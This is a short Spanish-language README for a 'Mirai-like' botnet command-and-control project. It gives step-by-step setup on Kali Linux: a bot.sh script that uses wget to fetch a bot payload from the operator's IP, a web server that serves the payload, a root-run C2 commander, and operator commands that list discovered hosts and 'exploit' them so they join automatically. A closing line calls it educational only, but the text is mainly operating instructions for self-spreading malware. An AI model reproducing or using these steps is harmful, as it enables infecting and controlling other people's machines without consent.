# Mirai-like Botnet C2

## Configuración en Kali Linux

### 1. Preparar certificados SSL
```bash
chmod +x setup_c2.sh
./setup_c2.sh
```

### 2. Editar configuraciones
En `bot_soldier.py` línea 24:
```python
C2_IP = 'TU_IP_KALI'  # Cambia esto a tu IP real
```

En `bot.sh`:
```bash
wget -q -O bot_soldier.py http://TU_IP_KALI/bot_soldier.py
```

### 3. Iniciar servidor web (en otra terminal)
```bash
python3 -m http.server 80
```

### 4. Iniciar C2 (requiere root para puerto 443)
```bash
sudo python3 c2_commander.py
```

### 5. Ejecutar bot inicial (en otra terminal o máquina)
```bash
python3 bot_soldier.py
```

## Uso

1. Espera a que el bot se conecte y reporte hosts
2. Lista hosts encontrados: `list 1`
3. Explotar un host: `exploit 1 1 http://TU_IP:80/bot.sh`
4. El nuevo host infectado se conectará automáticamente

## ADVERTENCIA
Este código es SOLO para fines educativos en entornos controlados.
